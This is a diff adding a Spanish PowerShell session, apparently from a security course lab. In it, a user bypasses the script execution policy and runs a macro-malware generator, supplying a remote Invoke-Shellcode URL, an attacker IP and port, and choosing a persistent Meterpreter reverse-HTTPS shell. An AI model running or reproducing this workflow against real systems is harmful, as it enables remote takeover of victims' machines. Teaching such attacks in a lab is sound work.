@@ -1,0 +1,61 @@
+PS C:\Users\Nuria> cd C:\Users\Nuria\Desktop
+PS C:\Users\Nuria\Desktop> dir
+
+    Directorio: C:\Users\Nuria\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       28/10/2024     10:11                Backdoor
+-a----       18/09/2019     10:52           1446 Microsoft Edge.lnk
+-a----       28/10/2024     10:34          26790 pruebamacro.ps1
+-a----       12/09/2017     18:42         541964 Tema5_Practica6_ExcelInfectado.pdf
+
+PS C:\Users\Nuria\Desktop> .\pruebamacro.ps1
+.\pruebamacro.ps1 : No se puede cargar el archivo C:\Users\Nuria\Desktop\pruebamacro.ps1 porque la ejecución de
+scripts está deshabilitada en este sistema. Para obtener más información, consulta el tema about_Execution_Policies en
+https:/go.microsoft.com/fwlink/?LinkID=135170.
+En línea: 1 Carácter: 1
++ .\pruebamacro.ps1
++ ~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : SecurityError: (:) [], PSSecurityException
+    + FullyQualifiedErrorId : UnauthorizedAccess
+
+PS C:\Users\Nuria\Desktop> Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
+
+Cambio de directiva de ejecución
+La directiva de ejecución te ayuda a protegerte de scripts en los que no confías. Si cambias dicha directiva, podrías
+exponerte a los riesgos de seguridad descritos en el tema de la Ayuda about_Execution_Policies en
+https:/go.microsoft.com/fwlink/?LinkID=135170. ¿Quieres cambiar la directiva de ejecución?
+[S] Sí  [O] Sí a todo  [N] No  [T] No a todo  [U] Suspender  [?] Ayuda (el valor predeterminado es "N"): S
+
+PS C:\Users\Nuria\Desktop> Get-ExecutionPolicy -List
+
+        Scope ExecutionPolicy
+        ----- ---------------
+MachinePolicy       Undefined
+   UserPolicy       Undefined
+      Process       Undefined
+  CurrentUser    RemoteSigned
+ LocalMachine       Undefined
+
+
+PS C:\Users\Nuria\Desktop> .\pruebamacro.ps1
+Enter URL of Invoke-Shellcode script (If you use GitHub, use the raw version): https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1
+Enter IP Address: 192.168.50.128
+Enter Port Number: 4444
+Enter the name of the document (Do not include a file extension): proyectosasir2
+
+--------Select Attack---------
+1. Meterpreter Shell with Logon Persistence
+2. Meterpreter Shell with Powershell Profile Persistence (Requires user to be local admin)
+3. Meterpreter Shell with Alternate Data Stream Persistence
+4. Meterpreter Shell with Scheduled Task Persistence
+------------------------------
+Select Attack Number & Press Enter: 1
+
+--------Select Payload---------
+1. Meterpreter Reverse HTTPS
+2. Meterpreter Reverse HTTP
+------------------------------
+Select Payload Number & Press Enter: 1
